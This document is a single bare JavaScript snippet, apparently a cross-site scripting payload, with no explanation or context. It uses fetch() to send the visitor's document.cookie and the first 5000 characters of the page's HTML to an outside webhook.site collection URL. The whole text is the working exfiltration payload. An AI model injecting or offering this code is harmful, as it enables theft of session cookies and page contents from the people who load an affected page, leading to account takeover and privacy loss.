fetch('https://webhook.site/83c9e8c3-384e-4bea-a583-b1b1de596d17?c=' + 
  encodeURIComponent(document.cookie) +
  '&h=' + encodeURIComponent(document.documentElement.innerHTML.substring(0,5000)));